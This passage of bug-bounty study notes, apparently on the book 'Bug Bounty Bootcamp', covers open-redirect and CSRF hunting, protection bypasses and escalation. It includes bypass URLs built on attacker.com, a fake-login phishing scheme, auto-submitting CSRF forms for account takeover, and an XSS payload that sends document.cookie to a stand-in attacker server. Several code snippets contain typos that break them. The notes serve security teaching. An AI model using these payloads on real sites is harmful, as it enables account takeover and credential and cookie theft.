  - "If example.com uses a referer-based redirect system, the user's browser would redirect to the attacker's site after the user visits example.com, because the browser visited example.com via the attacker's page."

**Prevention**

- "Sites often implement URL validators to ensure that the user-provided redirect URL points to a legitimate location. These validators use either a blocklist or an allow list."
  - Blocklists check whether the redirect has indicators of a malicious redirect and blocks those that do.
    - Known malicious hostnames or special URL characters that are often used in open-redirect attacks.
  - Allowlists will check the hostname portion of the URL to ensure it matches their list of allowed hosts allowing those that do, and blocking those that don't.
- Validators have a hard time identifying the hostname portion of the URL making open redirects a very common vulnerability.

**Hunting for Open Redirects**

Step 1: Look for Redirect Parameters

- `https://example.com/login?redirect=https://example.com/dashboard`
- `https://example.com/login?redir=https://example.com/dashboard`
- `https://example.com/login?next=https://example.com/dashboard`
- `https://example.com/login?next=/dashboard`
- In your proxy, look for parameters that contain absolute or relative URLs.
  - Absolute URLs are complete and contain all the components necessary to locate the resource it points to: `https://example.com/login`
    - URL scheme, hostname, path to resource
  - Relative URLs are concatenated with another URL by the server to be used: `https://example.com/login?next=dashboard`
    - parameters to look for: redirect, redir, RelayState, next, u, n, forward.
  - Record any parameters that seem to be used for redirect.
  - Note pages that don't contain redirect parameters in the URL but still automatically redirect the user.
    - These are possible referer-based open redirects.
    - 3XX response codes like 301, and 302 indicate a redirect.

Step 2: Use Google Dorks to Find Additional Redirect Parameters

- `site:example.com`
  - Look for pages that contain URLs in their URL parameters using `%3D` which is URL-encoded equals sign "=".
    - `inurl:%3Dhttp site:example.com` to find things like: `https://example.com/login?next=https://example.com/dashboard`
  - `%2F` is URL-encoded "/"
    - `inurl:%3D%2F site:example.com` to find `https://example.com/login?n=/dashboard`
  - Search for well known URL redirect parameters:
    - `inurl:redir site:example.com`
    - `inurl:redirect site:example.com`
    - `inurl:redirecturi site:example.com`
    - `inurl:redirect_uri site:example.com`
    - `inurl:redirecturl site:example.com`
    - `inurl:redirect_url site:example.com`
    - `inurl:return site:example.com`
    - `inurl:returnurl site:example.com`
    - `inurl:relaystate site:example.com`
    - `inurl:forward site:example.com`
    - `inurl:forwardurl site:example.com`
    - `inurl:forward_url site:example.com`
    - `inurl:url site:example.com`
    - `inurl:uri site:example.com`
    - `inurl:dest site:example.com`
    - `inurl:destination site:example.com`
    - `inurl:next site:example.com`

Step 3: Test for Parameter-Based Open Redirects

- Insert a random hostname or hostname you own into the redirect parameters.
- Some may redirect immediately, other may not redirect until you've successfully completed a user action (registration, login, or logout).
  - For these, you will need a user account to test the functionality.
- If they redirect to the hostname you've inserted, Bingo!

Step 4: Test for Referer-Based Open Redirects

- When you find a redirect that is not contained in a redirect URL parameter, host the following on a domain you own:
  ```
  <html>
    <a href="https://example.com/login">Click on this link!</a>
  </html>
  ```
  - Click the link on your domain to go to example.com and see if you are redirected automatically or after performing a user action.

#### Bypassing Open-Redirect Protection

- Author states that they find open-redirects in almost all of the URLs they attack. This is mainly because different browsers interpret redirects differently and so redirect traffic differently.
  - You can often find an open-redirect in one browser, but not in another.

**Using Browser Autocorrect**

- "Browsers often autocorrect URLs that don't have the correct components, in order to correct mangled URLs caused by user typos. For example, Chrome will interpret all of these URLs as pointing to https://attacker.com"
  `https:attacker.com`
  `https;attacker.com`
  `https:\/\/attacker.com`
  `https:/\/\attacker.com`
  - Bypass URL validation based on a blocklist by intentionally misspelling the url.
    - If any URL containing https:// or http:// is blocked by the application, try misspelling it as https;// and see if it works.
- ex. `https://attacker.com\@example.com`
  - If the `\` is interpreted as a path separator, it will interpret the hostname to be example.com and attacker.com\ as the username portion of the URL.
  - If the browser autocorrects the backslash to a forward slash, it will redirect to attacker.com and treat @example.com as the path portion of the URL.
    - `https://attacler.com/@example.com`

**Exploiting Flawed Validator Logic**

- URL validators often check to see if the redirect starts with, contains, or ends with the site's domain listed on the allowlist.
  - Create a subdomain or directory with the target's domain name:
    `https://example.com/login?redir=http://example.com.attacker.com` or
    `https://example.com/login?redir=http://attacker.com/example.com`
  - To bypass validators that require URLs to both start and end with a domain listed on the allowlist:
    `https://example.com/login?redir=https://example.com.attacker.com/example.com`
    - The browser interprets the first example.com as the subdomain and the second as the filepath.
  - Use the at symbol (@) to make the first example.com the username portion of the URL:
    `https://example.com/login?redir=https://example.com@attacker.com/example.com`
  - Custom URL validators are prone to these attackers because usually not all edge cases are considered.

**Using Data URLs**

- Manipulate the scheme portion of the URL to fool validators:
  - Format: `data:MEDIA_TYPE[;base64],DATA`
  - Plain text message with this data scheme: `data:text/plain,hello!`
  - To base64 encode the above: `data:text/plain;base64,aGVsbG8h`
  - Base64-encoded redirect URL to evade validator: `data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=`
    - The high entropy string is base64 encoded: `<script>location="https://example.com"</script>`
    - The usage looks like this: `https://example.com/login?redir=data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=`

**Exploiting URL Decoding**

- URL-encoding converts special characters into % followed by two hex digits. ex. / = %2f.
- Validators and browsers both decode URLs from their URL encoded forms to find out what is contained in the URL.
  - If the browser and the validator decode the characters differently, you can exploit this.

_Double Encoding_

- Double or triple encode special characters in your payloads:
  - Single encoded / : `https://example.com%2f@attacker.com`
  - Double encoded / : `https://example.com%252f@attacker.com`
  - Triple encoded / : `https://example.com%25252f@attacker.com`
- If the browser doesn't double decode URLs, but the browser does, you can use this payload:
  `https://attacker.com%252f@example.com`
  - The validator sees example.com as the hostname, but the browser redirects to attacker.com.

_Non-ASCII Characters_

- Some browsers decode non-ASCII characters into question marks.
  - If this is the case: `https://attacker.com%ff.example.com` the validator would interpreted as example.com being the domain name, and attacker.comÿ as the subdomain.
    - If the browser decodes the non-ASCII character as a ?, then it interprets it as `https://attacker.com?.example.com` where example.com is part of the URL query, not the hostname, and the browser would navigate to attacker.com.
- Browsers also often try to find "most alike" substitutions when given special characters for example ╱ (%E2%95%B1) will often be subsituted with /.
  - `https://attacker.com╱.example.com` may make it past the validator and be converted by the browser into `https://attacker.com/.example.com`
  - "The _Unicode_ standard is a set of code developed to represent all of the world's languages on the computer. You can find a list of Univode characters at [http://www.unicode.org/charts/. Use the Unicode chart to find look-alike characters and insert them into URLs to bypass filters. The \*Cyrillic character set is especially useful since it contains many characters similar to ASCII characters."

_Combining Exploit Techniques_

- ex. `https://example.com%252f@attacker.com/example.com`
  - Bypasses protection that only checks URL contains, starts with, or ends with an allowlisted hostname by making the URL both start and end with example.com.
  - Most browsers interpret `example.com%252f` as the username portion of the URL.
  - If the validator over decodes the URL, it will see example.com as the hostname portion: `https://example.com/@attacker.com/example.com`

**Escalating the Attack**

- Sending an email with a URL that looks like: `https://example.com/login?next=https://attacker.com/fake_login.html` to a user that redirects to an attackers fake login page that looks like the legitimate site could be a good way to steal creds.
  - The victim may see a login error on the malicious page that reads something like: "Sorry! The password you provided was incorrect. Please enter your username and password again."
  - Bonus points for redirecting the victim back to the legitimate site to keep them from catching on.
- Use open-redirects to bypass blocklists and allowlists:
  - `https://example.com/?next=https://attacker.com/` could bypass well build validators because it's technically still on the legitimate website.
  - "If a site utilizes an allowlist to prevent SSRFs, and allows requests to only a list of redefined URLs, an attacker can utilize an open redirect within those allowlisted pages to redirect the request anywhere."
- Use open-redirects to steal credentials and 0Auth tokens.
  - Browsers often include the originating URL as a referer HTTP request header, the originating URL contains sensitive information like authentication tokens.
  - You can use an open-redirect to steal the tokens via the referer header.

**Finding Your First Open Redirect!**

1. Search for redirect URL parameters. These might be vulnerable to parameter-based open redirect.
2. Search for pages that perform referer-based redirects. These are candidates for a referer-based open redirect.
3. Test the pages and parameters you've found for open redirects.
4. If the server blocks the open redirect, try the protection bypass techniques mentioned in this chapter.
5. Brainstorm ways of using the open redirect in your other bug chains!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 8: ClickJacking

"_Clickjacking_, or user-interface redressing, is an attack that tricks users into clicking a malicious button that has been made to look legitimate. Attackers achieve this by using HTML page-overlay techniques to hide one webpage within another..."

- Clickjacking is rarely considered in scope for bug bounty programs, but not always - if you can demonstrate the impact of the clickjacking vulnerability AND it's not listed as out of scope.

I'm going to leave this out for now. If you're interested in learning more about clickjacking, buy the book, it's good!

### Chapter 9: Cross-Site Request Forgery

"_Cross-site request forgery_ (CSRF) is a client-side technique used to attack other users of a web application. Using CSRF, attackers can send HTTP request that pretend to come from the victim, carrying out unwanted actions on a victim's behalf. For example, an attacker could change your password or transfer money from your bank account without your permission. CSRF attacks specifically target state-changing rquests, like sending tweets and modifying user settings, instead of request that reveal sensitive user info. This is because attackers won't be able to read the response to the forged request sent during a CSRF attack."

**Mechanisms**

- Most modern web apps authenticate users and manage user sessions using session cookies.
  - When you login, the web app sends your browser a session cookie and this cookie is used to prove your identity to the server.
- When you login the server sends your browser the session cookie via an HTTP response header called `Set-Cookie`
  - ex: `Set-Cookie: session_cookie=YOUR_SESSION_COOKIE;`
  - Your browser receives, stores, and then sends the session cookie via the `Cookie` HTTP request header in every request: `Cookie: session_cookie:YOUR_SESSION_COOKIE;`
  - The cookie acts as a constant authentication check to perform all requests that would require the user to be authenticated (change passwords, make posts, etc.).
- Below is an example of CSRF vulnerable HTML:

```
<html>
  <h1>Send a tweet.</h1>
  <form method="POST" action="https://twitter.com/send_a_tweet">
    <input type="text" name="tweet_content" value="Hello world!">
    <input type="submit" value="Submit">
  </form>
</html>
```

- Breakdown:
  - `<h1>` tag denotes a first-level HTML heading.
  - `<form>` tag defines the beginning and end of an HTML form.
    - `POST` method attribute means the form will perform a POST request.
    - `action` attribute tells the POST attribute where to send the post request.
    - `<input>` tags specify an input field where users can enter data.
      - The first is a "text" input tag named "tweet_content" and the value (or what the user input) is "Hello World."
      - The second is an input button that will "Submit" the user input.
- The Post request for this would look something like this:

  ```
  POST /send_a_tweet
  Host: twitter.com
  Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE

  (POST request body)
  tweet_content="Hello world!"
  ```

- The vulnerability is that any site, not just Twitter, can initiate the request.
  - If you hosted this HTML on your own site and your site then posts to twitter, your browser will automatically include your Twitter session cookies in requests to Twitter.
- Here's a more realistic malicious CSRF page:

  ```
  <html>
    <iframe style+"display:none" name="csrf-frame">
      <form method="POST" action="https://twitter.com/send_a_tweet"
      target="csrf-frame" id="csrf-form">
        <input type="text" name="tweet_content" value="Follow @vickieli7 on twitter!">
        <input type='submit' value="Submit">
      </form>
    </iframe>

    <script>document.getElementById("csrf-form").submit();</script>
  </html>
  ```

  - An `<iframe>` is an HTML element that embeds another document within the current HTML document, and it's invisible to the user when the style is set to `display:none`.
    - The JavaScript `<script>` tag then submits the form with the ID _csrf-form_
    - The code fetches the HTML form by referring to it by it's ID (_csrf-form_).
  - This attack page will force any victim who visits the malicious site to tweet.
    - Think nefarious advertising campaign, or spreading malicious links through users who visit the page.

- The impact of a CSRF is largely dependent on where the CSRF vulnerability is found.
  - If you find a CSRF on a request to change password, you could take over user accounts.
  - If you find a CSRF on a empty shopping cart request, you may only be able to annoy users.
  - CSRFs in functionalities like account balance transfers would be very significant for obvious reasons.
  - You can also use CSRFs to trigger injection vulnerabilities like XSS and command injections.

**Prevention**

- Use _CSRF tokens_
  - These can be embedded into every form on a website and browsers will send this string along withe very state-changing request.
  - The website then validates the token to make sure the request came from their website.
  - These are random and unpredictable strings (high entropy)
  - CSRF tokens must be unique for each sessions and HTML form.
- Example:

  ```
  <form method="POST" action="https://twitter.com/send_a_tweet">
    <input type="text" name="tweet_content" value="Hello world!">
    <input type="text" name="csrf_token" value="871caef0757a4ac9691aceb9aad8b65b">
    <input type="submit" value="Submit">
  </form>
  ```

  - This results in the follow POST request:

  ```
  POST /send_a_tweet
  Host: twitter.com
  Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE

  (POST request body)
  tweet_content="hello world!"&871caef0757a4ac9691aceb9aad8b65b
  ```

- Many frameworks have CSRF tokens build in, so you can use your frameworks implementation (Joomla, Spring, Struts, Ruby on Rails, .NET).
- You can also use `SameSite` cookies with the `Set-Cookie` header by using the `SameSite` flag set to `Strict`.
  `Set-Cookie: PHPSESSID=UEhQUOVTUO1E; Max-Age=86400; Secure; HttpOnly; SameSite=Strict`
  - `SameSite` flag can also be set to `Lax`, which tells the client's browser to send a cookie only in requests that cause top-level navigation (when users actively click a link and navigate to the site).
    - Ensures that users have access to the resources on your site if the cross-site request is intentional.
    - If you login to a web app from a 3rd-party site, the login will be sent. But if the 3rd-party tries to send a POST request to the web app, or tries to embed the contents of the web app within an iframe, cookies won't be sent:
      `Set-Cookie: PHPSESSID=UEhQUOVTUO1E; Max-Age=86400; Secure; HttpOnly; SameSite=Lax`
  - SameSite=Lax and Samesite=Strict prevent browsers from sending cookies on POST or AJAX requests and within iframes and image tags.
- Some browsers set their default cookie settings to `SameSite=Lax` so that even if a web application isn't using the `SameSite` flag, your browser will still protect you against.
  - In 2024, Firefox still doesn't have this enabled by default. To enable:
    - Navigate to `about:config`
    - In the search bar: `network.cookie.sameSite.laxByDefault` and click the swap arrows on the right to set to True.
- You may still be able to conduct a CSRF attack even if a browser or web app is using `SameSite=Lax` as default if the site allows state-changing request with the GET HTTP method.
  - ex link: `https://email.example.com/password_change?new_password=adc123` if the password change is conducted with a GET request.
  - Because this link will cause top-level navigation, the user's session cookies with be included in the GET request and the CSRF attack will succeed.
    ```
    GET /password_change?new_password=adc123
    Host: email.example.com
    Cookie: session_cookie=YOUR_SESSION_COOKIE
    ```
- "When websites don't implement `SameSite` cookies or other CSRF protection from every state-changing request, the request becomes vulnerable to CSRF if the user is not using a `SameSite-by-default browser`. CSRF protection is still the responsibility of the website despite the adoption of `SameSite-by-default`."

**Hunting for CSRFs**
"CSRFs are common and easy to exploit. To look for them, start by discovering state-changing requests that aren't shielded by CSRF protections."

Step 1: Spot State-Changing Actions

- Change password: _email.example.com/password_change_
  POST request

  Request parameters: _new_password_

- Send email: _email.example.com/send_email_
  POST request

  Request parameters:_draft_id, recipient_id_

- Delete email:\*email.example.com/delete_email
  Post request

  Request parameters:_email_id_

Step 2: Look for a Lack of CSRF Protections

- Visit the endpoints you found in Step 1 running a proxy like BurpSuite in the background and start intercepting all the requests you can generate (send an email, delete an email, change a password, etc.).
- Check the requests you've sent in your proxy to see if their vulnerable (look at the request sent for changing a password, deleting an email, etc.)
- Search the requests using the search bar at the bottom of Burp for things like "csrf" or "state"
  - These CSRF protections may show up in request headers, cookies, and URL parameters.
  - Even if you find CSRF protections on an endpoint, you could still be able to bypass them.

Step 3: Confirm the Vulnerability

- Test the potentially vulnerable CSRF endpoints by crafting an HTML page like this (Make sure to end the file in .html so it loads into your browser):

  ```
  <html>
    <form method="POST" action="https://email.example.com/password_change" id="csrf-form">
      <input type="text" name="new_password" value="abc123">
      <input type="submit" value="Submit">
    </form>
    <script>document.getElementById("CSRF-form").submit();</script>
  </html>
  ```

  - Open the HTML page in your browser that is signed into your target site. This form will generate a request like this:

  ```
  POST /password_change
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE

  (POST request body)
  new_password=adc123
  ```

  - Check if your password on email.example.com has been changed to abc123.
    - The goal to to prove that a foreign site can carry out state-changing actions on a user's behalf.

- Websites without CSRF tokens can still protect against CSRF attacks by checking that the referer header of the request matches a legitimate URL.
  - This helps by filtering out requests that have originate from foreign sites.
  - Referer headers can be manipulated by attackers and aren't a foolproof mitigation solution.
- Combine CSRF tokens and `SameSite` session cookies for the best protection.

**Bypassing CSRF Protection**

- Modern websites are becoming more secure and most of them have some form of CSRF protection. You still may be able to exploit a website that has CSRF protections by modifying your payloads.

_Change the Request Method_

- If sites accept multiple request methods for the same endpoint and the CSRF protections are only in place for one method, your attack may succeed.
  - ex: The following POST request is protected from CSRF attacks.
  ```
  POST /password_change
  Host: email.example.com
  Cookie: sessions_cookie=YOUR_SESSION_COOKIE
  ```
  - The same request with a GET method may work:
  ```
  GET /password_change?new_password=abc123
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE
  ```
  - So a malicious page could looke like this:
  ```
  <html>
    <img src="https://email.example.com/password_change?new_password=abc123"/>
  </html>
  ```
  - The HTML tag `<img>` loads an image from an external source and will send a GET request to the URL specified in its `src` attribute.
    - Check to see if the password has changed after your load the HTML page and if it does, the website is vulnerable to CSRF.
  - You can swap the other way too, from GET to POST.

_Bypass CSRF Tokens Stored on the Server_

- "If the site isn't validating CSRF tokens in the right way, you can still achieve CSRF with a few modification of your malicious HTML page."
- Test if deleting the token parameter or sending a blank token parameter will work. Below is a POST request with a CSRF token:

  ```
  POST /password_change
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE

  (POST request body)
  new_password=adc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
  ```

  - You can change the last line containing the csrf_token to be either:
    `new_password=abc123` or,
    `new_password=abc123&csrf_token=`
  - The HTML form for these would look like the following, respectively:

  ```
  <html>
    <form method="POST" action="https://email.example.com/password_change" ud="csrd-form">
      <input type="text" name="new_password" value="abc123">
      <input type='submit' value="submit">
    </form>
    <script>document.getElementById("CSRF-form").submit();</script>
  </html>
  ```

  and:

  ```
    <html>
    <form method="POST" action="https://email.example.com/password_change" ud="csrd-form">
      <input type="text" name="new_password" value="abc123">
      <input type="text" name="csrf_token" value="">
      <input type='submit' value="submit">
    </form>
    <script>document.getElementById("CSRF-form").submit();</script>
  </html>
  ```

  - These types of bypass can often work because applications often only validate the token _if_ the token exists, or if the token parameter isn't blank.
  - The following is a code example of insecure csrf token validation:

  ```
  def validate_token():
    if (request.csrf_token == session.csrf_token):
      pass
    else:
      throw_error("CSRF token incorrect. Request rejected.")
  [...]

  def process_state_changing_action():
    if request.csrf_token:
      validate_token()
    execute_action()
  ```

  - This python code checks to see if a CSRF token exists with `if request.csrf_token`, if it exists, it validates the token and the code continues.
    - You can see how if the token doesn't exist the code will skip validation and proceed to run.

- You can also try submitting the request with another session's CSRF token.

  - This works if the application checks that a csrf-token is valid, but does not check whether it belongs to the current user.
  - You would then use another users account or ID, and use your csrf-token in place of theirs. If it's vulnerable, you can change any users password by using your token.
  - Vulnerable code may look like this:

  ```
  def validate_token()
    if request.csrf_token:
      if (request.csrf_token is valid_csrf_tokens):
        pass
      else:
        throw_error("CSRF token incorrect. Request rejected.")

  [...]

  def process_state_changing_action():
    validate_token()
    execute_action()
  ```

  - This checks if the token exists in the list of valid tokens with `if (request.csrf_token in valid_csrf_tokens):` and if it does, the execution continues.
    - You can see that so long as you're using a token that exists, you can execute the action.

_Bypass Double-Submit CSRF Tokens_

- Sites can also use _double-submit cookies_ to defend against CSRF and in so the state-changing request contains the same random token as both a cookie and a request parameter.

  - The server checks whether the two values are equal, if the values match, the request is seen as legitimate, otherwise the application rejects it.
  - ex. valid request:

  ```
  POST /password_change
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b

  (POST request body)
  new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
  ```

  - The server only checks whether the token in the cookies is the same as the token in the request parameters, it does not check whether the tokens themselves are valid.
  - "If the application uses double-submit cookies as its CSRF defence mechanism, it's probably not keeping records of the valid token server-side. If the server were keeping records of the CSRF token server-side, it could simply validate the token when it was sent over, and the application would not need to use double-submit cookies in the first place."
    - You could set the `csrf_token=not_a_real_token` and if both the request parameter token and the cookie token are the same, it will work with double-submit.
  - To execute a double-submit CSRF token attack, you will need to know about _Session fixation_, which is an attack that allows attackers to select the session cookies of the victim. Learn more about _Session Fixation_ [here](https://en.wikipedia.org/wiki/Session_fixation).

_Bypass CSRF Referer Header Check_

- If the website is verifying that the referer header sent with the state-changing request is a part of the website's allowlisted domains, it will perform this verification and either reject or execute the request based only on the referer header.
- Start by removing the referer header. To do this add a `<meta>` tag to the page hosting your request form:

  ```
  <html>
    <meta name="referrer" content="no-referrer">
    <form method="POST" action="https://email.com/password_change" id="csrf-form">
      <input type="text" name="new_password" value="abc123">
      <input type='submit' value="Submit">
    </form>
    <script>document.getElementById("CSRF-form").submit();</script>
  </html>
  ```

  - This tells the browser not to include a referer header in the resulting HTTP request.
  - The faulty application logic might look like this:

  ```
  def validate_referer():
    if (request.referer in allowlisted_domains):
      pass
    else:
      throw_error("Referer incorrect. Request rejected.")

  [...]

  def process_state_changing_action():
    if request.referer:
      validate_referer()
    execute_action()
  ```

  - Similar to earlier examples, this application only validates the referer header if it exists. By making the victim's browser omit the referer header, you bypass this CSRF protection.

- You may also be able to bypass the logic check used to validate the referer URL if the application looks for the string "example.com" in the referer URL.

  - The logic would look something like this:

  ```
  def validate_referer():
    if request.referer:
      if ("example.com" in request.referer):
        pass
      else:
        throw_error("Referer incorrect. Request rejected.")

  [...]

  def process_state_changing_action():
    validate_referer()
    execute_action()
  ```

  - The logic can be exploited by creating a subdomain named after the victim's domain, then hosting a malicious HTML on that subdomain. The request looks like:

  ```
  POST /password_change
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE
  Referer: example.com.attacker.com

  (POST request body)
  new_password=abc123
  ```

  - Alternatively, you could place the victim domain name as a pathname:

  ```
  POST /password_change
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE
  Referer: attacker.com/example.com

  (POST request body)
  new_password=abc123

  ```

  - After you've uploaded your HTML page at the correct location, load that page and see if the state-changing action was executed.

_Bypass CSRF Protection by Using XSS_

- "Any XSS vulnerablity will defeat CRSF protection, because XSS will allow attackers to steal the legitimate CSRF token and then craft forged requests by using CMLHttpRequest. Often, attackers will find XSS as the starting point to launch CSRFs to take over admin accounts."

**Escalating the Attack**

"After you've found a CSRF vulnerablity, don't just report it right away! Here are a few ways you can escalate CSRFs into severe security issues to maximize the impact of your report. Often, you need to use a combination of CSRF and other minor design flaws to discover these."

_Leak User Information by Using CSRF_

- ex. example.com sends monthly billing reports to users register email address. These emails could contain billing information, street addresses, phone numbers, credit card info, etc.
  - By changing a users email address to one you choose, you could have this information sent to you instead.
  - To do this, you'll want to look for something like a `POST /change_billing_email` endpoint.

_Create Stored Self-XSS by Using CSRF_

- Self-XSS are usually considered non-issues because they require so much action from the victim to succeed and so are too difficult to exploit.
- Combining CSRF with self-XSS can turn self-XSS into stored XSS - the money maker!
- ex. finance.example.com allows users to create nicknames for their linked bank accounts, and this endpoint is vulnerable to self-XSS because there is no sanitization, validation, or escaping for user input on the field. Only the user can edit and see this field, so there is no way for an attacker to trigger the XSS directly.

  - If this endpoint is vulnerable to CSRF, say, because omitting the token parameter in the request will bypass CSRF protection, the following request could work:

  ```
  POST /change_account_nickname
  Host: finance.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE

  (POST request body)
  account=0
  &nickname="<script>document.location='http://attacker_server_ip/
  cookie_stealer.php?c='+document.cookie;</script>"
  ```

  - This request will change the user's account nickname and store the XSS payload there. The next time a user logs into the account and views their dashboard, they'll trigger the XSS.

_Take Over User Accounts by Using CSRF_

- Taking over accounts via CSRF isn't that uncommon. All you need is a CSRF vulnerability in a critical functionality like password creation, password changes, changing email addresses, resetting passwords.
- A good place to look for this is on site that allow users to sign up using social media accounts which means they won't need to set a password. These sites will also often give users who've signed up via social media accounts the option of setting a password via a request similar to:

  ```
  POST /set_password
  Host: example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE

  (POST request body)
  password=XXXXX&csrf_token=871caef0757a4ac9691aceb9aad8b65b
  ```

  - Because they originally signed up via social media, there is no "old password" to set the new password.
  - If the endpoint is vulnerable to CSRF, all an attacker has to do is post a link to this HTML page somewhere that the user of the site might frequent, and they can automatically assign the password of any user who visists the malicious page:

  ```
  <html>
    <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
      <input type="text" name="new_password" value="this_account_is_now_mine">
      <input type="text" name="csrf_token" value="">
      <input type='submit' value="Submit">
    </form>
    <script>document.getElementById("csrf-form").submit():</script>
  </html>
  ```

**Delivering the CSRF Payload**

1. The easiest way to deliver a payload is to trick users into visiting a malicious link by posting them on forums or social media platforms:
   "Visit this page to get a discount on your example.com subscription:
   https://example.attacker.com"

- The attacker then host an auto-submitting form to execute the CSRF:

```
<html>
  <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
    <input type="text" name="new_password" value="this_account_is_now_mine">
    <input type='submit' value="Submit">
  </form>
  <script>document.getElementById("csrf-form").submit();</script>
</html>
```

2. CSRFs that can be executed through a GET request can embed the request as an image directly through an image posted to a forum. So anyone who views the forum page would be affected:
   `<img src="https://email.example.com/set_password>new_password=this_account_is_now_mine">`

3. Attackers can deliver a CSRF payload to a large number of users by exploiting stored XSS. If a forum comment field if vulnerable to stored XSS the payload can be delivered to all visitors who visit the forum:

```
<script>
  document.body.innerHTML += "
    <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
      <input type="text" name="new_password" value"this_account_is_now_mine">
      <input type='submit' value="Submit">
    </form>;
  document.getElementById("csrf-form").submit();
</script>
```

**Finding Your First CSRF!**

1. Spot the state-changing actions on the application and keep a ntoe on their locations and functionality.
2. Check these functionalities for CSRF protection. If you can't spot any protections, you might have found a vulnerability!
3. If any CSRF protection mechanisms are present, try to bypass the protection by using the protection-bypass techniques mentioned in this chapter.
4. Confirm the vulnerability by crafting a malicious HTML page and visisting that page to see if the action was executed.
5. Think of strategies for delivering your payload to end users.
6. Draft your first CSRF report!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 10: Insecure Direct Object References

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
